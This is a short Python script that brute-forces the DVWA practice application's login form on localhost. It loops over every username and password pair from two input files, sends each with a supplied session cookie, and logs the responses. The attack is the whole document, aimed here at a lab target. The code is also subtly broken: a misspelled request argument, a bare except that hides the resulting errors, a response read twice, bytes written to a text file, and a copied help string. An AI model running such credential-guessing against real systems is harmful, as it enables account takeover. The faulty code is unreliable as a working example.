import argparse
import urllib3 # https://urllib3.readthedocs.io/en/latest/user-guide.html
http = urllib3.PoolManager()

# handle command line input arguments
parser = argparse.ArgumentParser()
parser.add_argument('users', type=str, help="this is the username file")
parser.add_argument('passwords', type=str, help="this is the passwords file")
parser.add_argument('phpsessid', type=str, help="this is the passwords file")
args = parser.parse_args()

# load user name and password files
with open(args.users, "r") as f:
    names = f.read().split("\n")

with open(args.passwords, "r") as f:
    creds = f.read().split("\n")


for name in names:
    for cred in creds:
        print (name+':'+cred)
        try:
            resp = http.request(
                "GET",
                f'http://127.0.0.1/dvwa/vulnerabilities/brute/index.php?username={name}&password={cred}&Login=Login',
                retrys=False,
                headers={
                    "Cookie": f"security=low; PHPSESSID={args.phpsessid}"
                }
            )
            print(resp.read())
            with open("responses.txt", "a") as f:
                f.write(resp.read())
        except:
            print('exception')      
